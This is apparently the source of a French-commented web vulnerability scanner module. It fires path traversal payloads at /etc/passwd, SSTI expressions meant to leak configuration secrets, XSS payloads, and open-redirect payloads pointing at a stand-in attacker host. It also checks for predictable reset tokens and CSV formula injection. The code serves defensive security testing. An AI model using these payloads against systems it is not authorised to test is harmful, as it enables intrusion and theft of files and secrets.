"""
Sondes actives « angles morts DAST » — classes web classiques que les moteurs
API (BOLA/mass-assignment/SSRF/JWT/business-flow) ne couvrent pas :

  - Path traversal / LFI     (lecture de fichiers hors périmètre)
  - SSTI                      (injection de gabarit côté serveur)
  - XSS réfléchi et stocké    (injection HTML/JS)
  - Open redirect             (redirection non validée)
  - Jeton de reset prédictible (dérivé d'une valeur publique)
  - Injection de formule CSV  (export tableur)

Philosophie identique aux autres sondes : DÉTERMINISTE par marqueurs. On injecte
une charge dont l'effet est non ambigu (`root:x:0:0`, `49`, un `<svg onload>` non
échappé, un `Location:` vers un hôte attaquant…) et on ne remonte un finding que
sur PREUVE. Pas de modèle, pas de spéculation : ces classes se prouvent par
observation directe. Chaque finding sort au vocabulaire commun
(modules.llm.investigation : CONFIRMED/SUSPECTED).

Exécuteur attendu : `execute(url, method, body=None) -> {'status','body','location'}`
(`location` = en-tête Location de la réponse, redirections NON suivies).
"""
import copy
import hashlib
import json
import re
from dataclasses import dataclass
from typing import Callable, Dict, Iterator, List, Optional, Tuple
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from .utils import get_logger

logger = get_logger("web.probes")


@dataclass
class WebFinding:
    category: str      # LFI / SSTI / XSS / OPEN_REDIRECT / WEAK_RESET / CSV_INJECTION
    owasp: str
    severity: str
    title: str
    url: str
    detail: str = ''
    source: str = 'deterministic'
    confidence: float = 0.9

    def flat(self) -> Dict:
        v = self.verdict
        return {'source': f'web_{self.category.lower()}', 'risk': self.severity,
                'name': self.title, 'url': self.url, 'owasp': self.owasp,
                'status': v.status, 'adjudication': v.source}

    @property
    def verdict(self):
        from .llm.investigation import Verdict, Evidence, CONFIRMED, SUSPECTED
        status = CONFIRMED if self.source == 'deterministic' else SUSPECTED
        return Verdict(status, self.detail or self.title, self.confidence, self.source,
                       Evidence(request=self.url, note=self.detail))


# --- charges & marqueurs ----------------------------------------------------
_LFI_PAYLOADS = [
    '../../../../../../etc/passwd',
    '..%2f..%2f..%2f..%2f..%2fetc%2fpasswd',      # séparateur encodé
    '....//....//....//....//etc/passwd',          # anti-« remplace ../ »
    '/etc/passwd', 'file:///etc/passwd',
]
_LFI_MARKER = re.compile(r'root:.*:0:0:')
# clé de paramètre ou segment d'endpoint évoquant un accès fichier
_FILE_HINT = re.compile(r'(file|path|dir|folder|doc|document|page|template|tpl|'
                        r'include|load|download|attachment|img|image|media|asset|'
                        r'name|filename|src|resource|view|read)', re.I)

# SSTI : marqueurs arithmétiques multi-moteurs (49) + fuite de contexte python.format
_SSTI_ARITH = [('{{7*7}}', '49'), ('${7*7}', '49'), ('#{7*7}', '49'),
               ('<%= 7*7 %>', '49'), ('{7*0x7}', None)]   # dernier: bruit volontaire ignoré
_SSTI_CTX_VARS = ['{config}', '{settings}', '{self}', '{request}', '{env}', '{g}']
_SSTI_LEAK_MARKER = re.compile(r'(secret|token|api[_-]?key|password|passwd)', re.I)

_XSS_MARK = 'hzx9'
_XSS_PAYLOADS = [f'{_XSS_MARK}<svg/onload=alert(1)>',
                 f'"><script>{_XSS_MARK}()</script>',
                 f"'{_XSS_MARK}<img src=x onerror=alert(1)>"]

_REDIRECT_HINT = re.compile(r'(redirect|url|next|to|dest|destination|return|'
                            r'returnurl|continue|callback|goto|link|target|forward)', re.I)
_EVIL_HOST = 'harzap-oob.example'
_REDIRECT_PAYLOADS = [f'https://{_EVIL_HOST}/', f'//{_EVIL_HOST}/',
                      f'https:\\/\\/{_EVIL_HOST}/']

_RESET_HINT = re.compile(r'(reset|forgot|recover|password)', re.I)
_FORMULA_LEAD = ('=', '+', '-', '@', '\t', '\r')


# --- points d'injection (query + corps JSON) --------------------------------
def _iter_string_leaves(obj, path=()) -> Iterator[Tuple[tuple, str]]:
    if isinstance(obj, dict):
        for k, v in obj.items():
            if isinstance(v, (dict, list)):
                yield from _iter_string_leaves(v, path + (k,))
            elif isinstance(v, str):
                yield path + (k,), v
    elif isinstance(obj, list):
        for i, v in enumerate(obj):
            yield from _iter_string_leaves(v, path + (i,))


def _set_in(obj, path, value):
    new = copy.deepcopy(obj)
    cur = new
    for p in path[:-1]:
        cur = cur[p]
    cur[path[-1]] = value
    return new


def _points(target: Dict):
    """Rend (label, key, method, mutate) pour chaque paramètre injectable — en
    query string ET dans les feuilles chaîne du corps JSON."""
    url, method = target.get('url', ''), target.get('method', 'GET')
    parsed = urlparse(url)
    for p in parse_qs(parsed.query):
        def mutate(payload, _p=p, _parsed=parsed):
            q = {k: v[:] for k, v in parse_qs(_parsed.query).items()}
            q[_p] = [payload]
            return urlunparse((_parsed.scheme, _parsed.netloc, _parsed.path, _parsed.params,
                               urlencode(q, doseq=True), _parsed.fragment)), None
        yield f"query '{p}'", p, method, mutate
    body = target.get('body')
    if isinstance(body, (dict, list)):
        for bpath, _ in _iter_string_leaves(body):
            def mutate(payload, _bp=bpath, _body=body, _url=url):
                return _url, _set_in(_body, _bp, payload)
            yield "body '" + '.'.join(map(str, bpath)) + "'", str(bpath[-1]), method, mutate


def injectable_targets(har_data: Dict, limit: int = 25) -> List[Dict]:
    """Requêtes du HAR portant au moins un paramètre injectable (query ou corps)."""
    out, seen = [], set()
    for e in (har_data or {}).get('log', {}).get('entries', []) or []:
        req = e.get('request', {})
        url = req.get('url', '')
        method = (req.get('method', 'GET') or 'GET').upper()
        parsed = urlparse(url)
        body = None
        text = (req.get('postData', {}) or {}).get('text', '')
        if text:
            try:
                body = json.loads(text)
            except Exception:
                body = None
        has_q = bool(parse_qs(parsed.query))
        has_b = isinstance(body, (dict, list)) and any(True for _ in _iter_string_leaves(body))
        if not (has_q or has_b):
            continue
        key = (method, parsed.path)
        if key in seen:
            continue
        seen.add(key)
        out.append({'url': url, 'method': method, 'body': body})
        if len(out) >= limit:
            break
    return out


def _get(execute_fn, url, method, body):
    try:
        return execute_fn(url, method, body) or {}
    except TypeError:
        return execute_fn(url, method) or {}


# =============================================================================
# Path traversal / LFI  (OWASP API mappe en API8/Misconfiguration côté DAST)
# =============================================================================
def probe_path_traversal(execute_fn: Callable, targets: List[Dict]) -> List[WebFinding]:
    findings: List[WebFinding] = []
    for t in targets:
        path_hint = _FILE_HINT.search(urlparse(t.get('url', '')).path or '')
        for label, key, method, mutate in _points(t):
            if not (path_hint or _FILE_HINT.search(key)):
                continue
            for payload in _LFI_PAYLOADS:
                probe_url, probe_body = mutate(payload)
                r = _get(execute_fn, probe_url, method, probe_body)
                if _LFI_MARKER.search(r.get('body', '') or ''):
                    findings.append(WebFinding('LFI', 'API8:2023', 'Critical',
                        f"Path traversal — arbitrary file read via {label}",
                        probe_url, f"payload {payload} leaked /etc/passwd"))
                    break
            else:
                continue
            break  # une preuve par cible suffit
    return findings


# =============================================================================
# SSTI — Server-Side Template Injection
# =============================================================================
def probe_ssti(execute_fn: Callable, targets: List[Dict]) -> List[WebFinding]:
    findings: List[WebFinding] = []
    for t in targets:
        for label, key, method, mutate in _points(t):
            hit = _ssti_point(execute_fn, method, mutate, label)
            if hit:
                findings.append(hit)
                break
    return findings


def _ssti_point(execute_fn, method, mutate, label) -> Optional[WebFinding]:
    # 1) évaluation arithmétique (Jinja2/Twig/Freemarker/ERB/Velocity…)
    for payload, marker in _SSTI_ARITH:
        if marker is None:
            continue
        probe_url, probe_body = mutate(f"hz{payload}hz")
        r = _get(execute_fn, probe_url, method, probe_body)
        body = r.get('body', '') or ''
        if f"hz{marker}hz" in body or (marker in body and payload not in body):
            return WebFinding('SSTI', 'API8:2023', 'Critical',
                f"SSTI — template expression evaluated via {label}",
                probe_url, f"{payload} rendered as {marker}")
    # 2) fuite de variable de contexte (python str.format)
    for payload in _SSTI_CTX_VARS:
        probe_url, probe_body = mutate(payload)
        r = _get(execute_fn, probe_url, method, probe_body)
        body = r.get('body', '') or ''
        if _SSTI_LEAK_MARKER.search(body) and payload not in body:
            return WebFinding('SSTI', 'API8:2023', 'Critical',
                f"SSTI — context/config leaked via {label}",
                probe_url, f"{payload} expanded to sensitive content")
    return None


# =============================================================================
# XSS réfléchi
# =============================================================================
def _is_html(resp: Dict) -> bool:
    """Contexte HTML requis pour une vraie XSS : un `<svg>` réfléchi dans une
    réponse JSON n'est pas exécutable. On se fie au Content-Type, à défaut à une
    empreinte HTML dans le corps (et jamais si ça commence comme du JSON)."""
    ct = (resp.get('content_type', '') or '').lower()
    if 'html' in ct:
        return True
    if ct and ('json' in ct or 'plain' in ct or 'csv' in ct):
        return False
    body = (resp.get('body', '') or '').lstrip()
    if body[:1] in ('{', '['):
        return False
    return bool(re.search(r'<(html|body|div|span|p|h1|a|article)\b', body, re.I))


def probe_reflected_xss(execute_fn: Callable, targets: List[Dict]) -> List[WebFinding]:
    findings: List[WebFinding] = []
    for t in targets:
        for label, key, method, mutate in _points(t):
            hit = None
            for payload in _XSS_PAYLOADS:
                probe_url, probe_body = mutate(payload)
                r = _get(execute_fn, probe_url, method, probe_body)
                body = r.get('body', '') or ''
                if payload in body and _is_html(r):   # réfléchi SANS échappement, en contexte HTML
                    hit = WebFinding('XSS', 'API8:2023', 'High',
                        f"Reflected XSS — payload reflected unescaped via {label}",
                        probe_url, f"{payload} returned verbatim in an HTML response")
                    break
            if hit:
                findings.append(hit)
                break
    return findings


# =============================================================================
# XSS stocké  (injecte sur une écriture, relit sur les GET du HAR)
# =============================================================================
def probe_stored_xss(execute_fn: Callable, har_data: Dict,
                     read_urls: Optional[List[str]] = None) -> List[WebFinding]:
    findings: List[WebFinding] = []
    reads = read_urls or _get_urls(har_data)
    n = 0
    for t in injectable_targets(har_data):
        if t['method'] == 'GET' or not isinstance(t.get('body'), (dict, list)):
            continue
        for label, key, method, mutate in _points(t):
            # Nonce unique par point : sans lui, une charge identique déjà stockée
            # (commentaire injecté plus tôt) serait re-trouvée et MAL attribuée.
            n += 1
            payload = f'{_XSS_MARK}{n}<svg/onload=alert({n})>'
            probe_url, probe_body = mutate(payload)
            _get(execute_fn, probe_url, method, probe_body)   # écrit la charge
            for ru in reads:
                r = _get(execute_fn, ru, 'GET', None)
                if payload in (r.get('body', '') or '') and _is_html(r):
                    findings.append(WebFinding('XSS', 'API8:2023', 'High',
                        f"Stored XSS — payload persisted via {label}, rendered at {urlparse(ru).path}",
                        ru, f"injected on {urlparse(probe_url).path}, reflected unescaped in HTML on read"))
                    return findings         # une preuve suffit (borne les relectures)
    return findings


def _get_urls(har_data: Dict) -> List[str]:
    urls, seen = [], set()
    for e in (har_data or {}).get('log', {}).get('entries', []) or []:
        req = e.get('request', {})
        if (req.get('method', 'GET') or 'GET').upper() != 'GET':
            continue
        u = req.get('url', '')
        p = urlparse(u).path
        if u and p not in seen:
            seen.add(p)
            urls.append(u)
    return urls


# =============================================================================
# Open redirect
# =============================================================================
def probe_open_redirect(execute_fn: Callable, targets: List[Dict]) -> List[WebFinding]:
    findings: List[WebFinding] = []
    for t in targets:
        for label, key, method, mutate in _points(t):
            if not _REDIRECT_HINT.search(key):
                continue
            hit = None
            for payload in _REDIRECT_PAYLOADS:
                probe_url, probe_body = mutate(payload)
                r = _get(execute_fn, probe_url, method, probe_body)
                loc = (r.get('location', '') or '')
                status = int(r.get('status', 0))
                if 300 <= status < 400 and _EVIL_HOST in loc:
                    hit = WebFinding('OPEN_REDIRECT', 'API8:2023', 'Medium',
                        f"Open redirect — Location to attacker host via {label}",
                        probe_url, f"{status} Location: {loc}")
                    break
                if _EVIL_HOST in (r.get('body', '') or '') and 'refresh' in (r.get('body', '') or '').lower():
                    hit = WebFinding('OPEN_REDIRECT', 'API8:2023', 'Medium',
                        f"Open redirect — meta/JS redirect to attacker host via {label}",
                        probe_url, "attacker host in refresh/location")
                    break
            if hit:
                findings.append(hit)
                break
    return findings


# =============================================================================
# Jeton de reset prédictible  (API2 — Broken Authentication)
# =============================================================================
def probe_predictable_reset(execute_fn: Callable, har_data: Dict) -> List[WebFinding]:
    findings: List[WebFinding] = []
    for e in (har_data or {}).get('log', {}).get('entries', []) or []:
        req = e.get('request', {})
        url = req.get('url', '')
        if not _RESET_HINT.search(urlparse(url).path):
            continue
        text = (req.get('postData', {}) or {}).get('text', '')
        try:
            body = json.loads(text) if text else {}
        except Exception:
            body = {}
        ident = body.get('username') or body.get('email') or body.get('user') or body.get('login')
        if not ident:
            continue
        r = _get(execute_fn, url, req.get('method', 'POST').upper(), body)
        token = _extract_token(r.get('body', '') or '')
        if token and _token_is_predictable(token, str(ident)):
            findings.append(WebFinding('WEAK_RESET', 'API2:2023', 'High',
                f"Predictable reset token derived from public identifier ('{ident}')",
                url, f"token '{token}' matches a hash/encoding of the identifier"))
    return findings


def _extract_token(body: str) -> Optional[str]:
    try:
        data = json.loads(body)
    except Exception:
        return None
    if isinstance(data, dict):
        for k, v in data.items():
            if 'token' in k.lower() and isinstance(v, str) and v:
                return v
    return None


def _token_is_predictable(token: str, ident: str) -> bool:
    """Le jeton dérive-t-il d'une valeur publique (nom/email) ? md5/sha1/sha256,
    tronqués ou non — cas typique d'un reset « fait maison »."""
    cands = set()
    for algo in ('md5', 'sha1', 'sha256'):
        h = hashlib.new(algo, ident.encode()).hexdigest()
        cands.add(h)
        for n in (6, 8, 10, 12, 16):
            cands.add(h[:n])
    return token.lower() in cands


# =============================================================================
# Injection de formule CSV  (passif : scanne les exports CSV du HAR)
# =============================================================================
def probe_csv_injection(har_data: Dict) -> List[WebFinding]:
    findings: List[WebFinding] = []
    for e in (har_data or {}).get('log', {}).get('entries', []) or []:
        resp = e.get('response', {})
        req = e.get('request', {})
        url = req.get('url', '')
        ctype = ''
        for h in resp.get('headers', []):
            if h.get('name', '').lower() == 'content-type':
                ctype = h.get('value', '')
        body = (resp.get('content', {}) or {}).get('text', '') or ''
        is_csv = 'csv' in ctype.lower() or urlparse(url).path.lower().endswith('.csv')
        if not is_csv or not body:
            continue
        for line in body.splitlines()[1:]:            # saute l'en-tête
            for cell in line.split(','):
                if cell[:1] in _FORMULA_LEAD:
                    findings.append(WebFinding('CSV_INJECTION', 'API8:2023', 'Medium',
                        "CSV formula injection — un-neutralized formula-leading cell in export",
                        url, f"cell starts with formula char: {cell[:24]!r}"))
                    return findings                   # une preuve suffit par export
    return findings


# =============================================================================
# Orchestrateur
# =============================================================================
def run_web_probes(execute_fn: Callable, har_data: Dict,
                   targets: Optional[List[Dict]] = None) -> List[Dict]:
    """Lance toutes les sondes « angles morts » et rend des findings à plat."""
    targets = targets if targets is not None else injectable_targets(har_data)
    out: List[WebFinding] = []
    out += probe_path_traversal(execute_fn, targets)
    out += probe_ssti(execute_fn, targets)
    out += probe_reflected_xss(execute_fn, targets)
    out += probe_open_redirect(execute_fn, targets)
    out += probe_stored_xss(execute_fn, har_data)
    out += probe_predictable_reset(execute_fn, har_data)
    out += probe_csv_injection(har_data)
    flat = [f.flat() for f in out]
    logger.info("web_probes_done", findings=len(flat))
    return flat
